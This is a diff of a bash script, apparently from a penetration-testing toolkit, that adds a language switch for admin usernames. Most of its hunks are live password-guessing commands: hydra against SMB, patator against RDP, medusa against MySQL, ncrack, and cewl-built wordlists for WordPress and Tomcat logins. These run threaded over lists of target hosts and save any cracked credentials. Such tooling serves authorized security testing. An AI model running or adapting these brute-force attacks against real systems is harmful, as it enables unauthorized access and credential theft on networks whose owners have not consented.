@@ -29,12 +29,13 @@ echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR #####
 
 
 
-while getopts ":e:d:t:h:" OPTIONS
+while getopts ":e:d:t:l:h:" OPTIONS
 do
             case $OPTIONS in
             e)     ENTIDAD=$OPTARG;;
             t)     TYPE=$OPTARG;;
-            d)     DICTIONARY=$OPTARG;;            
+            d)     DICTIONARY=$OPTARG;; 
+			l)     LANGUAGE=$OPTARG;;           
             ?)     printf "Opcion invalida: -$OPTARG\n" $0
                           exit 2;;
            esac
@@ -43,6 +44,7 @@ done
 ENTIDAD=${ENTIDAD:=NULL}
 DICTIONARY=${DICTIONARY:=NULL}
 TYPE=${TYPE:=NULL}
+LANGUAGE=${LANGUAGE:=NULL} # en/es
 tomcat_passwrods_combo="/usr/share/lanscanner/tomcat-passwds.txt"
 
 if [[ ${ENTIDAD} = NULL  && ${DICTIONARY} = NULL  ]];then 
@@ -69,6 +71,12 @@ fi
 
 #rm enumeracion/* 2>/dev/null
 #rm .vulnerabilidades/* 2>/dev/null
+
+if [ "$LANGUAGE" == "es" ]; then
+	admin_user='administrador'
+else
+	admin_user='administrator'
+fi
 
 if [ $DICTIONARY = NULL ] ; then
 
@@ -115,20 +123,19 @@ if [ -f servicios/Windows.txt ]
 then
 	echo -e "\n\t $OKBLUE Testing windows auth  $RESET"	  	
 	
-	interlace -tL servicios/Windows.txt -threads 10 -c "echo  '\n hydra -l administrator -P top.txt -t 1 _target_  smb' >> logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
-	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrator -P top.txt -t 1 _target_  smb >> logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo  '\n hydra -l $admin_user -P top.txt -t 1 _target_  smb' >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l $admin_user -P top.txt -t 1 _target_  smb >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
 
-	interlace -tL servicios/Windows.txt -threads 10 -c "echo  '\n hydra -l administrador -P top.txt -t 1 _target_  smb' >> logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
-	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrador -P top.txt -t 1 _target_  smb >> logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
+	if [ "$LANGUAGE" == "es" ]; then
+		interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l soporte -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+		interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l soporte -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
 		
-	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l soporte -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
-	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l soporte -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
-	
-	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l sistemas -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
-	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l sistemas -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
-	
-	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent
-	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinado.txt 2>/dev/null" --silent		
+		interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l sistemas -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+		interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l sistemas -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	fi
+		
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent		
 			
 fi
 
@@ -170,13 +177,13 @@ if [ -f servicios/rdp.txt ]; then
 		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  
 		
 		####### user administrador ####
-		patator.py rdp_login host=$ip user=administrador password=FILE0 0=top.txt -x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED' 2> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
+		patator.py rdp_login host=$ip user=$admin_user password=FILE0 0=top.txt -x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED' 2> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
 		egrep -iq  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK|ERRCONNECT_CONNECT_CANCELLED" logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then	
 			echo -e "\t$OKRED[!] Password found \n $RESET"
 			creds=`egrep  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK|ERRCONNECT_CONNECT_CANCELLED"  logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt | awk '{print $9}'`
-			echo "administrador:$creds" >> .vulnerabilidades/"$ip"_rdp_passwordAdivinadoWin.txt
+			echo "$admin_user:$creds" >> .vulnerabilidades/"$ip"_rdp_passwordAdivinadoWin.txt
 		fi	
 		##############################
 
@@ -221,19 +228,14 @@ then
 		path=`echo $path | sed 's/wp-login.php//'` #borrar wp-login.php y dejar path como / o /web/
 
 		
-		echo -e "\n\t########### $ip_port #######"
-				
-		echo -e "\n\t########### extract passwords from $proto_ip_port #######"
-		
-
-#			echo "webData.pl -t $ip -d $path -p $port -e todo -l /dev/null -r 4 "			
+		echo -e "\n\t########### $ip_port #######"				
 		echo ""
 		if [[ $fingerprint = *"wordpress"* ]]; then
-			echo -e "$OKGREEN \t[+] Wordpress identificado en $ip:$port $RESET"
-			echo -e "\t[+] Probando contraseñas comunes ...."	
+			echo -e "$OKGREEN \t[+] Wordpress identificado en $ip:$port $RESET"				
+			echo -e "\n\t########### extract passwords from $proto_ip_port #######"
 			cewl -w cewl-passwords.txt -e -a $proto_ip_port
 			cat top.txt cewl-passwords.txt | sort | uniq > top-web.txt			
-			# 
+			echo -e "\t[+] Probando contraseñas comunes ...."
 			if [ -f ".vulnerabilidades2/"$ip"_"$port"_wpUsers.txt" ]; then
 				#https://181.115.188.36:443/				
 				for user in $(cat .vulnerabilidades2/"$ip"_"$port"_wpUsers.txt | awk '{print $2}'); do
@@ -325,8 +327,9 @@ then
 			rm username.txt
 					
 		fi	
-					
-		if [[ $fingerprint = *"tomcat"* ]]; then
+		echo "fingerprint $fingerprint"	
+		echo "line $line"	
+		if [[ $fingerprint = *"tomcat"* || $line = *'/manager/html'* ]]; then
 			echo -e "\t[+] Tomcat identificado ($ip_port_path)"										
 			echo -e "\t\t[+] Testing common passwords"	
 			#echo "patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwrods_combo" 
@@ -667,8 +670,8 @@ then
 			echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
 			medusa -e n -u admin -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
 			
-			echo -e "\n medusa -e n -u administrador -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
-			medusa -e n -u administrador -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null			
+			echo -e "\n medusa -e n -u $admin_user -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+			medusa -e n -u $admin_user -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null			
 			
 			#echo -e "\n medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
 			#medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
@@ -954,7 +957,7 @@ then
 		ncrack_instances=`pgrep ncrack | wc -l`
 		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
 		then
-			ncrack --user 'administrador' -P top.txt -p $port -g cd=8 $ip | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
+			ncrack --user "$admin_user" -P top.txt -p $port -g cd=8 $ip | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
 			echo ""		
 		else
 			echo "Max instancias de ncrack ($max_ins)"
@@ -982,7 +985,7 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 						
-		grep --color=never "administrador" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
+		grep --color=never "$admin_user" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
 		echo ""			
 	  done
 	 	 	 
